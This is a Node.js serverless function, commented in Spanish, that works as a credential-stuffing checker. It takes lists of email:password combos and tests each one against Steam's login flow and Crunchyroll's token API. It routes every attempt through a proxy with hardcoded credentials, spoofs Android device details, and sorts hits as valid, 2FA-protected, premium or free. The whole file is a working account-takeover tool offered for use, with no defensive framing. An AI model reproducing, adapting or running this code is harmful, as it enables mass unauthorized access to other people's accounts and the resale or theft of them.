const axios = require('axios');
const crypto = require('crypto');
const forge = require('node-forge');
const { HttpsProxyAgent } = require('https-proxy-agent');

exports.handler = async (event) => {
    const headers = {
        'Access-Control-Allow-Origin': '*',
        'Access-Control-Allow-Headers': 'Content-Type',
        'Access-Control-Allow-Methods': 'POST, OPTIONS'
    };

    if (event.httpMethod === 'OPTIONS') return { statusCode: 200, headers, body: '' };
    if (event.httpMethod !== 'POST') return { statusCode: 405, headers, body: 'Method Not Allowed' };

    const proxies = [
        'http://poxweudy:pvma7be69xzy@45.38.107.97:6014'
    ];

    try {
        const { service, combos } = JSON.parse(event.body);
        const results = [];

        for (const combo of combos) {
            if (!combo.includes(':')) continue;
            const [email, password] = combo.split(':');

            const proxyUrl = proxies[Math.floor(Math.random() * proxies.length)];
            const agent = new HttpsProxyAgent(proxyUrl);
            
            let isValid = false;
            let reason = 'Credenciales inválidas';

            if (service === 'steam') {
                try {
                    // 1. AGARRAMOS LA COOKIE DE SESIÓN Y EL RSA
                    const initRes = await axios.get('https://store.steampowered.com/login/', { httpsAgent: agent, timeout: 10000 });
                    const cookies = initRes.headers['set-cookie'] ? initRes.headers['set-cookie'].map(c => c.split(';')[0]).join('; ') : '';
                    
                    const rsaRes = await axios.get(`https://store.steampowered.com/login/getrsakey/?username=${encodeURIComponent(email)}`, { 
                        headers: { 'Cookie': cookies },
                        httpsAgent: agent, 
                        timeout: 10000 
                    });
                    
                    if (rsaRes.data && rsaRes.data.success) {
                        // 2. ENCRIPTAMOS LA CLAVE
                        const pubKey = forge.pki.rsa.setPublicKey(
                            new forge.jsbn.BigInteger(rsaRes.data.publickey_mod, 16),
                            new forge.jsbn.BigInteger(rsaRes.data.publickey_exp, 16)
                        );
                        const encryptedPass = forge.util.encode64(pubKey.encrypt(password));

                        // 3. MANDAMOS EL LOGIN
                        const loginRes = await axios.post('https://store.steampowered.com/login/dologin/', 
                            new URLSearchParams({
                                username: email,
                                password: encryptedPass,
                                rsatimestamp: rsaRes.data.timestamp,
                                remember_login: 'true'
                            }).toString(),
                            { 
                                headers: { 
                                    'Content-Type': 'application/x-www-form-urlencoded',
                                    'Cookie': cookies
                                },
                                httpsAgent: agent, 
                                timeout: 15000 
                            }
                        );

                        if (loginRes.data.success) {
                            isValid = true;
                            reason = 'Válida (Sin 2FA)';
                        } else if (loginRes.data.requires_twofactor) {
                            isValid = true;
                            reason = 'Válida (Pide 2FA)';
                        } else {
                            // ACÁ TE ESCUPE EL ERROR REAL DE STEAM
                            reason = 'Error Steam: ' + (loginRes.data.message || JSON.stringify(loginRes.data));
                        }
                    }
                } catch (e) {
                    reason = 'Error de proxy/red: ' + e.message;
                }
            } else {
                // Lógica de Crunchyroll
                const randomDeviceId = crypto.randomBytes(16).toString('hex');
                const randomDeviceName = 'SM-G' + Math.floor(Math.random() * 9000 + 1000);
                try {
                    const res = await axios.post('https://beta-api.crunchyroll.com/auth/v1/token', 
                        new URLSearchParams({
                            grant_type: 'password',
                            username: email, password: password, scope: 'offline_access',
                            device_id: randomDeviceId, device_name: randomDeviceName, device_type: 'samsung ' + randomDeviceName
                        }).toString(),
                        {
                            headers: {
                                'Authorization': 'Basic d2piMV90YThta3Y3X2t4aHF6djc6MnlSWlg0Y0psX28yMzRqa2FNaXRTbXNLUVlGaUpQXzU=',
                                'Content-Type': 'application/x-www-form-urlencoded',
                                'User-Agent': 'Crunchyroll/3.59.0 Android/14 okhttp/4.12.0'
                            },
                            httpsAgent: agent, timeout: 15000
                        }
                    );
                    if (res.status === 200 && res.data.access_token) {
                        const isPremium = res.data.scope.includes('mp offline_access');
                        isValid = true;
                        reason = isPremium ? 'PREMIUM' : 'FREE';
                    }
                } catch (e) {
                    reason = 'Credenciales inválidas (o bloqueo)';
                }
            }

            results.push({ email, valid: isValid, reason: reason });
        }
        return { statusCode: 200, headers, body: JSON.stringify({ results }) };
    } catch (e) {
        return { statusCode: 500, headers, body: JSON.stringify({ error: e.message }) };
    }
};
